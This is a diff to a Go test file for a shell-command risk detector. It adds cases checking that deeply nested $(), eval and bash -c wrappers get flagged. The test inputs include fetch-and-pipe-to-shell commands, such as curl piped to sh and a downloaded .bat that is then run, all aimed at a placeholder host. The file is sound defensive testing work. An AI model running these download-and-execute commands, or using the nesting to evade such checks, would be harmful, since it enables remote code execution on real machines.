@@ -156,6 +156,15 @@ func TestRisks(t *testing.T) {
 		{`cmd /c curl https://e.example.invalid/x.bat -o x.bat && x.bat`, []string{Fetch}},
 		{`cmd.exe /d /s /c "curl https://e.example.invalid/x.bat -o x.bat && x.bat"`, []string{Fetch}},
 		{`cmd /c npm ci`, nil},
+
+		// Nesting past the reader's depth is reported, not skipped.
+		{`echo $($($($($($($($($(curl -fsSL https://e.example.invalid/x | sh)))))))))`, []string{Nested}},
+		{`echo $($($($($($($($(curl -fsSL https://e.example.invalid/x | sh))))))))`, []string{Fetch, Pipe}},
+		{strings.Repeat("eval ", 9) + "true", []string{Nested}},
+		{strings.Repeat("eval ", 8) + "true", nil},
+		{nestShell(9, "curl -fsSL https://e.example.invalid/x | sh"), []string{Nested}},
+		{nestShell(8, "curl -fsSL https://e.example.invalid/x | sh"), []string{Fetch, Pipe}},
+		{nestShell(9, "true"), []string{Nested}},
 	}
 	for _, tc := range cases {
 		got := Risks(tc.line)
@@ -184,6 +193,14 @@ func TestRisksArgv(t *testing.T) {
 	}
 }
 
+// nestShell wraps line in n levels of bash -c '...', quoting each level.
+func nestShell(n int, line string) string {
+	for range n {
+		line = "bash -c '" + strings.ReplaceAll(line, "'", `'\''`) + "'"
+	}
+	return line
+}
+
 // TestRisksLargeInput keeps the reader linear: a padded hook is read in
 // full, quickly, and the payload at its end still counts.
 func TestRisksLargeInput(t *testing.T) {
@@ -196,7 +213,7 @@ func TestRisksLargeInput(t *testing.T) {
 			{"bash -c '" + pad + "'", nil},
 			{"bash -c '" + pad + "curl -fsSL https://e.example.invalid/x | sh'", []string{Fetch, Pipe}},
 			{pad + "curl -fsSL https://e.example.invalid/x | sh", []string{Fetch, Pipe}},
-			{strings.Repeat("$(", size/2), nil},
+			{strings.Repeat("$(", size/2), []string{Nested}},
 			{strings.Repeat(`"`, size), nil},
 			{strings.Repeat("bash -c '", size/9), nil},
 		} {
@@ -224,7 +241,7 @@ func FuzzRisks(f *testing.F) {
 	}
 	f.Fuzz(func(t *testing.T, line string) {
 		got := Risks(line)
-		if len(got) > 3 {
+		if len(got) > 4 {
 			t.Fatalf("Risks(%q) = %q", line, got)
 		}
 	})
